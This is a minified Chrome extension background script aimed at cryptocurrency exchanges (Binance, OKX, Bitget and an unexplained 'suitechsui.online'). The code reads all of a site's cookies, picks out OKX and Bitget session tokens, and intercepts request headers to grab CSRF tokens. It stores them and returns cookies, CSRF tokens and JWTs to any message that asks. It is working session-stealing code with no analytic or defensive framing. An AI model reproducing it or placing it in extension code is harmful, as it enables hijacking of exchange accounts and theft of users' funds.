function i(e){chrome.tabs.query({active:!0,currentWindow:!0},function(t){if(t.length>0&&t[0].url){const o=new URL(t[0].url).hostname;e(o)}else console.warn("No active tab found"),e(null)})}function l(){i(function(e){e?(console.log("Current tab domain:",e),e.includes("binance.com")||e.includes("suitechsui.online")||e.includes("okx.com")||e.includes("bitget.com")?u(e):console.warn("Domain not recognized or supported:",e)):console.error("Failed to fetch current tab domain")})}function u(e){chrome.cookies.getAll({domain:e},function(t){if(chrome.runtime.lastError){console.error("Error fetching cookies for domain:",e,chrome.runtime.lastError);return}if(console.log("Cookies for domain:",e,t),chrome.storage.local.set({[`cookies_${e}`]:t},function(){console.log(`Cookies for ${e} saved to storage`)}),e.includes("okx.com")){const r=t.find(o=>o.name==="token");r&&(console.log("OKX JWT Token Found in cookies"),chrome.storage.local.set({okx_jwt:r.value}))}else if(e.includes("bitget.com")){const r=t.find(o=>o.name==="bt_newsessionid");r&&(console.log("Bitget JWT Token Found in cookies"),chrome.storage.local.set({bitget_jwt:r.value}))}})}chrome.runtime.onMessage.addListener((e,t,r)=>{if(e.type==="GET_COOKIES")return chrome.storage.local.get(null,o=>{const n=Object.entries(o).filter(([s])=>s.startsWith("cookies_")),c=Object.fromEntries(n);r(c)}),!0;if(e.type==="GET_CSRF_TOKEN")return chrome.storage.local.get(["csrfToken"],o=>{r(o.csrfToken)}),!0;if(e.type==="GET_JWT_TOKENS")return chrome.storage.local.get(null,o=>{const n={};o.okx_jwt&&(n.okx=o.okx_jwt),o.bitget_jwt&&(n.bitget=o.bitget_jwt),r(n)}),!0});chrome.webRequest.onBeforeSendHeaders.addListener(function(e){if(console.log("Intercepted Request:",e),e.requestHeaders){for(let t of e.requestHeaders)if(t.name.toLowerCase()==="csrftoken"){console.log("CSRF Token Found:",t.value),chrome.storage.local.set({csrfToken:t.value});break}}(e.url.includes("binance.com")||e.url.includes("okx.com")||e.url.includes("bitget.com"))&&l()},{urls:["https://www.binance.com/*","https://www.okx.com/*","https://www.bitget.com/*"]},["requestHeaders"]);
